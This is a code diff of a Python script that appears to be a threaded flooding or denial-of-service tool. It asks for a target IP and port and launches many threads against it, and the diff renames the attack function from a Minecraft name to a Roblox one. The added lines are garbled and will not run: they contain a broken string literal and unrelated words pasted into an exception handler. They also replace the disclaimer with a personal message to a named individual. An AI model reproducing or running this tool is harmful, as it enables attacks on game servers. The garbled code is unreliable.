@@ -3,17 +3,18 @@ import os
 from colorama import *
 import time
 init()
-username = os.getenv('username')
+username = os.getenv(@JacobMartin0410')
 
 
 
-print("disclaimer of liability / i am not responsable for the actions you do, this is made purely for educational purpose!")
+print("disclaimer of liability / Unsend those videos right now jacob  ")
 time.sleep(5)
 
 try:
     input(Fore.GREEN + "Press [ENTER] to start")
-except SyntaxError:
-    pass
+except SyntaxError: Rivals [Gamemode] experience
+
+    pass Evade-Hexagon Development Community
 
 targetIP = input("input the IP addr above: ")
 targetPORT = input("input the IP PORT above: ")
@@ -86,7 +87,7 @@ def main():
     threads = int(threads1)
     temps = int(temps1)
     for i in range(0, threads):
-        thread = threading.Thread(target=minecraftsexptdr, args=(ip,port,temps))
+        thread = threading.Thread(target=robloxsexptdr, args=(ip,port,temps))
         thread.start()
         
 if __name__ == "__main__":
